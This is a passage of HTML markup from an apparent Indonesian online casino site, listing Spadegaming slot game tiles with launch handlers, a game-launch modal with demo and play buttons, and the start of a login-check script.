                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wong Choy" data-filter="ALL,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wong Choy', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/8b4d4d9eedce3e6aeabf499154861832.webp?v=0.1' , 'S-WC02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/8b4d4d9eedce3e6aeabf499154861832.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wong Choy">Wong Choy</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Money Mouse" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Money Mouse', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/0ccfea9c181b02adf13494a963ca3776.webp?v=0.1' , 'S-MM01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/0ccfea9c181b02adf13494a963ca3776.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Money Mouse">Money Mouse</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Three Lucky Stars" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Three Lucky Stars', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/f82d41b1ddd06a86c556aa305417db62.webp?v=0.1' , 'S-LS02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/f82d41b1ddd06a86c556aa305417db62.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Three Lucky Stars">Three Lucky Stars</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Bakery" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Bakery', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/e89cb141e15ff0bd118fc1d137416f93.webp?v=0.1' , 'S-SB01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/e89cb141e15ff0bd118fc1d137416f93.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Bakery">Sweet Bakery</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Prosperity Gods" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Prosperity Gods', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/3e0af25c433377e070ab120a4567ac2d.webp?v=0.1' , 'S-PG01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/3e0af25c433377e070ab120a4567ac2d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Prosperity Gods">Prosperity Gods</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Brothers kingdom" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Brothers kingdom', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/7d0fad54f6a2cc1f981d249cdf3fdf70.webp?v=0.1' , 'S-GK01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/7d0fad54f6a2cc1f981d249cdf3fdf70.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Brothers kingdom">Brothers kingdom</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Heroes" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Heroes', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/fe50561accf38f96f8fcab24d0512d95.webp?v=0.1' , 'S-HE01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/fe50561accf38f96f8fcab24d0512d95.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Heroes">Heroes</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mr Chu Tycoon" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mr Chu Tycoon', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/02fe8483350631713fd2499481f5267d.webp?v=0.1' , 'S-CH01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/02fe8483350631713fd2499481f5267d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mr Chu Tycoon">Mr Chu Tycoon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gold Panther" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gold Panther', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/00c51e7e8bad52f9142b7116e31278de.webp?v=0.1' , 'S-GP01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/00c51e7e8bad52f9142b7116e31278de.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gold Panther">Gold Panther</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Magical lamp" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Magical lamp', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/171b76712926b8b773ecd905dc8371e6.webp?v=0.1' , 'S-ML01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/171b76712926b8b773ecd905dc8371e6.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Magical lamp">Magical lamp</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Triple Panda" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Triple Panda', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/f3f95c209d02a6d50a4d95f512caa19b.webp?v=0.1' , 'S-TP02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/f3f95c209d02a6d50a4d95f512caa19b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Triple Panda">Triple Panda</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dancing Fever" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dancing Fever', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/f9d0fbe2930263f786e9d071b5eef332.webp?v=0.1' , 'S-DF02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/f9d0fbe2930263f786e9d071b5eef332.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dancing Fever">Dancing Fever</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Golden Whale" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Golden Whale', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/483626092be0dfb9d2057acc6f890dcc.webp?v=0.1' , 'S-GW01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/483626092be0dfb9d2057acc6f890dcc.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Golden Whale">Golden Whale</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Da Fu Xiao Fu" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Da Fu Xiao Fu', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/4e94e029c8a3500b11f16e3390109f3e.webp?v=0.1' , 'S-DX01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/4e94e029c8a3500b11f16e3390109f3e.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Da Fu Xiao Fu">Da Fu Xiao Fu</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky  Meow" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky  Meow', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/de681c109bf31c14b7befadb7b247035.webp?v=0.1' , 'S-LM01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/de681c109bf31c14b7befadb7b247035.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky  Meow">Lucky  Meow</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Adventure Iceland" data-filter="ALL,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Adventure Iceland', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/5498cb9685b14c6188b4113e14b36843.webp?v=0.1' , 'S-IL02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/5498cb9685b14c6188b4113e14b36843.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Adventure Iceland">Adventure Iceland</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Highway Fortune" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Highway Fortune', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/4a9e94418945697324e3e9db4e16c381.webp?v=0.1' , 'S-HF01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/4a9e94418945697324e3e9db4e16c381.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Highway Fortune">Highway Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="5 Fortune" data-filter="ALL,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '5 Fortune', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/6bb41a603f48a7885b5fb75e6b7a8679.webp?v=0.1' , 'S-WM02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/6bb41a603f48a7885b5fb75e6b7a8679.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="5 Fortune">5 Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Koi" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Koi', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/5326d2ea1d221525d367fb082418cb9f.webp?v=0.1' , 'S-LK01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/5326d2ea1d221525d367fb082418cb9f.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Koi">Lucky Koi</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Gold" data-filter="ALL,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Gold', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/7445a62104b4e75468f902117dc9c8da.webp?v=0.1' , 'S-DG03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/7445a62104b4e75468f902117dc9c8da.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Gold">Dragon Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Emperor Gate" data-filter="ALL,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Emperor Gate', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/a0b83f05a16e3c234bd70c0a57176b75.webp?v=0.1' , 'S-EG02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/a0b83f05a16e3c234bd70c0a57176b75.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Emperor Gate">Emperor Gate</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Prosperity" data-filter="ALL,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Prosperity', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/43be5f6760bdedff54a0be39eec8fead.webp?v=0.1' , 'S-FC02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/43be5f6760bdedff54a0be39eec8fead.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Prosperity">Big Prosperity</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Feng Shui" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Feng Shui', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/b4b6fe0d30f19e8c0a1ab6bf57a27017.webp?v=0.1' , 'S-LF01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/b4b6fe0d30f19e8c0a1ab6bf57a27017.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Feng Shui">Lucky Feng Shui</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Great Stars" data-filter="ALL,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Great Stars', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/a65c613c5024294e8668ad457d796d8b.webp?v=0.1' , 'S-GS03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/a65c613c5024294e8668ad457d796d8b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Great Stars">Great Stars</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Double Fortunes" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Double Fortunes', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/69d8cf8b3423fd5f502c8cc6344bf2f1.webp?v=0.1' , 'S-DF01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/69d8cf8b3423fd5f502c8cc6344bf2f1.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Double Fortunes">Double Fortunes</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pocket Mon Go" data-filter="ALL,JP PROGRESSIVE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pocket Mon Go', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/71b8b9e7b2b7bfb05fceea392299fabd.webp?v=0.1' , 'S-PO01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/71b8b9e7b2b7bfb05fceea392299fabd.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pocket Mon Go">Pocket Mon Go</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="King Pharaoh" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'King Pharaoh', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/bf4345cd2d6be19c3cf4f038cd5cee3e.webp?v=0.1' , 'S-PH02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/bf4345cd2d6be19c3cf4f038cd5cee3e.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="King Pharaoh">King Pharaoh</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Baby Cai Shen" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Baby Cai Shen', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/be763cb033f76255568f20896e08478d.webp?v=0.1' , 'S-BC01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/be763cb033f76255568f20896e08478d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Baby Cai Shen">Baby Cai Shen</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Great Stars SA" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Great Stars SA', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/fab8a883ed783839249f5c905cc9f9db.webp?v=0.1' , 'S-GS04', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/fab8a883ed783839249f5c905cc9f9db.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Great Stars SA">Great Stars SA</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Prosperity SA" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Prosperity SA', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/19c2368a2732ed31ab38b83f2238ceed.webp?v=0.1' , 'S-FC03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/19c2368a2732ed31ab38b83f2238ceed.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Prosperity SA">Big Prosperity SA</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Iceland SA" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Iceland SA', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/e9c588ce317bd72a8f3b37bc31b47ea5.webp?v=0.1' , 'S-IL03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/e9c588ce317bd72a8f3b37bc31b47ea5.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Iceland SA">Iceland SA</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="5 Fortune SA" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '5 Fortune SA', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/81d5ff20e7487a624e70677cde8017b9.webp?v=0.1' , 'S-WM03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/81d5ff20e7487a624e70677cde8017b9.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="5 Fortune SA">5 Fortune SA</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Gold SA" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Gold SA', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/bd864c9588b2a13084a948fe503ac349.webp?v=0.1' , 'S-DG04', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/bd864c9588b2a13084a948fe503ac349.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Gold SA">Dragon Gold SA</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ho Yeah Monkey" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ho Yeah Monkey', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/e485616684a95e1575b0c095ae10ce00.webp?v=0.1' , 'S-HY01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/e485616684a95e1575b0c095ae10ce00.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ho Yeah Monkey">Ho Yeah Monkey</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Golden Chicken" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Golden Chicken', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/c470d89e6fa04c6f748dd95b8d3067f5.webp?v=0.1' , 'S-GC03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/c470d89e6fa04c6f748dd95b8d3067f5.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Golden Chicken">Golden Chicken</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Tiger Warrior" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Tiger Warrior', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/dad54437f1b3be5fd3447b2b3a9299b0.webp?v=0.1' , 'S-TW01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/dad54437f1b3be5fd3447b2b3a9299b0.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Tiger Warrior">Tiger Warrior</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jungle King" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jungle King', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/2e80b9737124c2a6d9620679ea29554e.webp?v=0.1' , 'S-TZ01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/2e80b9737124c2a6d9620679ea29554e.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jungle King">Jungle King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wow Prosperity" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wow Prosperity', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/e6e5e71bb102080204848a37a33adfce.webp?v=0.1' , 'S-WP02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/e6e5e71bb102080204848a37a33adfce.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wow Prosperity">Wow Prosperity</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Candy Pop" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Candy Pop', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/22d9b60b51cf790f01589d13d957d387.webp?v=0.1' , 'S-CP01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/22d9b60b51cf790f01589d13d957d387.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Candy Pop">Candy Pop</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="FaFaFa2" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'FaFaFa2', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/8f894437714c67c0f814f43afe6a7e08.webp?v=0.1' , 'S-LY02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/8f894437714c67c0f814f43afe6a7e08.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="FaFaFa2">FaFaFa2</h5>
        </a>
        
     
  </div>

</div>

<div class="nifty-modal slide-in-bottom " id="gamelinksModal-1">
	<div class="md-content">
		<div class="md-body">
			<div class="row mb-4 no-gutters">
				<div class="col-xs-5">
					<img src="" class="img-fluid">
				</div>
				<div class="col-xs-7">
					<div class="g-title"></div>
				</div>
				<input type="hidden" value="" name="hiddenGameCode001" id="hiddenGameCode001">
				<input type="hidden" value="" name="hiddenSubGameCode001" id="hiddenSubGameCode001">

			</div>

			<div class="row  pt-2">
				<div class="col-xs-5">
										<button class="btn btn-block btn-secondary" onclick="subGameLaunch(event, 1)" i18n="@TryNow">
						DEMO
					</button>
									</div>
				<div class="col-xs-7   ">
					<button class="btn  btn-block btn-primary" onclick="subGameLaunch(event,0)" i18n="@PlayNow">
						MAIN SEKARANG					</button>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="md-overlay"></div>
<script>
  function subGameLaunch(e, isDemo) {
    if (!window.isAuth) {
      if (typeof alertLogin === "function") alertLogin(e);
      return;
